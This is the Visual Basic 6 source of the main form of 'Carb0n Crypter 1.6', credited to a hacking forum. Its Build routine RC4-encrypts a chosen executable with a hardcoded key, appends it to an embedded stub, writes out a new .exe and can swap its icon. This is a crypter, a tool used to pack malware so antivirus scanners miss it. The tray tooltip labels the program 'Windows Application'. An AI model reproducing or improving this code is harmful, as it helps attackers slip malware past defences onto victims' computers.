VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form Form1 
   BackColor       =   &H00000000&
   BorderStyle     =   0  'None
   Caption         =   "Carb0n Crypter 1.6"
   ClientHeight    =   2730
   ClientLeft      =   7620
   ClientTop       =   7020
   ClientWidth     =   5790
   ControlBox      =   0   'False
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   2730
   ScaleWidth      =   5790
   StartUpPosition =   1  'CenterOwner
   Begin Project1.chameleonButton chameleonButton3 
      Height          =   285
      Left            =   4440
      TabIndex        =   6
      Top             =   2280
      Width           =   1095
      _ExtentX        =   1296
      _ExtentY        =   503
      BTYPE           =   14
      TX              =   "About"
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   12632256
      BCOLO           =   12632256
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   12632256
      MPTR            =   1
      MICON           =   "Form1.frx":0E02
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   0   'False
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Project1.chameleonButton chameleonButton2 
      Height          =   285
      Left            =   1440
      TabIndex        =   5
      Top             =   2280
      Width           =   1095
      _ExtentX        =   1296
      _ExtentY        =   503
      BTYPE           =   14
      TX              =   "Icon"
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   12632256
      BCOLO           =   12632256
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   12632256
      MPTR            =   1
      MICON           =   "Form1.frx":0E1E
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   0   'False
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Project1.chameleonButton chameleonButton1 
      Height          =   285
      Left            =   240
      TabIndex        =   4
      Top             =   2280
      Width           =   1095
      _ExtentX        =   1296
      _ExtentY        =   503
      BTYPE           =   14
      TX              =   "Build"
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   12632256
      BCOLO           =   12632256
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   12632256
      MPTR            =   1
      MICON           =   "Form1.frx":0E3A
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   0   'False
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Project1.chameleonButton Command1 
      Height          =   285
      Left            =   4440
      TabIndex        =   3
      Top             =   1800
      Width           =   1095
      _ExtentX        =   1296
      _ExtentY        =   503
      BTYPE           =   14
      TX              =   "Browse"
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   12632256
      BCOLO           =   12632256
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   12632256
      MPTR            =   1
      MICON           =   "Form1.frx":0E56
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   0   'False
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin VB.TextBox Path 
      Height          =   285
      Left            =   240
      OLEDropMode     =   1  'Manual
      TabIndex        =   2
      Text            =   "File Path..."
      Top             =   1800
      Width           =   4095
   End
   Begin VB.PictureBox Picture1 
      Height          =   1215
      Left            =   240
      Picture         =   "Form1.frx":0E72
      ScaleHeight     =   1155
      ScaleWidth      =   5235
      TabIndex        =   1
      Top             =   480
      Width           =   5295
      Begin MSComDlg.CommonDialog CommonDialog1 
         Left            =   2520
         Top             =   360
         _ExtentX        =   847
         _ExtentY        =   847
         _Version        =   393216
      End
   End
   Begin Project1.UsrSkin UsrSkin1 
      Height          =   2670
      Left            =   120
      TabIndex        =   0
      Top             =   240
      Width           =   5535
      _ExtentX        =   10186
      _ExtentY        =   4710
   End
   Begin VB.Image Image2 
      Height          =   255
      Left            =   1440
      Top             =   3240
      Width           =   615
   End
   Begin VB.Image Image1 
      Height          =   375
      Left            =   600
      Top             =   2280
      Width           =   855
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'carb0n crypter series
'by carb0n
'http://hackhound.org

Private Sub chameleonButton2_Click()
Form2.Show
End Sub
Private Sub chameleonButton1_Click()

Dim Info As String
Dim Stub As String
Dim sData() As Byte
Dim sFile As Long

    sFile = FreeFile
    sData() = LoadResData("EXE", "CUSTOM")
    
If Form1.Path.Text = "" Or Form1.Path.Text = "File Path..." Then
MsgBox "Please select a file.", vbInformation
Exit Sub
Else
End If

Open App.Path & "/Stub.exe" For Binary Access Write As #sFile
    Put #sFile, , sData()
    Close #sFile
Open App.Path & "/Stub.exe" For Binary Access Read As #1
    Stub = Input(LOF(1), 1)
    Close #1
Stub = Stub & "lehfvd3856"
Open Path.Text For Binary Access Read As #1
    Info = Info & Input(LOF(1), 1)
    Close #1
Info = RC4_String(Info, "carb0n")

CommonDialog1.DialogTitle = "Select Output"
CommonDialog1.DefaultExt = "exe"
CommonDialog1.Filter = "Executables (*.exe)|*.exe|All Files (*.*)|*.*"
CommonDialog1.ShowSave

Open CommonDialog1.FileName For Binary Access Write As #1
    Put #1, 1, Stub & Info
    Close #1
    Info = ""
    
Kill App.Path & "/Stub.exe"

If Form2.Check1.Value = 1 Then
Call ReplaceIcons(Form2.Text1.Text, Path.Text, vbNullString)
Else
End If

MsgBox "Success! File is now crypted.", vbOKOnly
End Sub

Private Sub chameleonButton3_Click()
Form3.Show
End Sub

Private Sub Command1_Click()
CommonDialog1.DialogTitle = "Please Select Executable"
CommonDialog1.FileName = vbNullString
CommonDialog1.DefaultExt = "exe"
CommonDialog1.Filter = "Executables (*.exe)|*.exe|All Files (*.*)|*.*"
CommonDialog1.ShowOpen
Path.Text = CommonDialog1.FileName
End Sub

Private Sub Form_Load()
Form1.Path.Text = "File Path..."
UsrSkin1.SkinCaption = Me.Caption
UsrSkin1.SkinActivate
With nid
.cbSize = Len(nid)
.hwnd = Me.hwnd
.uId = vbNull
.uFlags = NIF_ICON Or NIF_TIP Or NIF_MESSAGE Or NIF_INFO
.uCallBackMessage = WM_MOUSEMOVE
.hIcon = Me.Icon
.szTip = "Windows Application" & vbNullChar
.dwState = 0
.dwStateMask = 0
.uTimeout = 3
End With
Shell_NotifyIcon NIM_ADD, nid
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
UsrSkin1.SkinDeactivate
End Sub

Private Sub Form_Resize()
UsrSkin1.Move 0, 0, ScaleWidth, ScaleHeight
End Sub

Private Sub Form_Terminate()
Call Shell_NotifyIcon(NIM_DELETE, nid)
End Sub

Private Sub Form_Unload(Cancel As Integer)
Call Shell_NotifyIcon(NIM_DELETE, nid)
Unload Form1
Unload Form2
Unload Form3
Unload Me
UsrSkin1.SkinDeactivate
End
End Sub

Private Sub UsrSkin1_SkinMaximize()
Me.WindowState = IIf(Me.WindowState = vbMaximized, vbNormal, vbMaximized)
End Sub

Private Sub UsrSkin1_SkinMinimize()
Me.WindowState = vbMinimized
End Sub

Private Sub UsrSkin1_SkinMouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
If Button = vbLeftButton Then FormDrag Me
End Sub

Private Sub UsrSkin1_SkinUnload()
Unload Me
End Sub

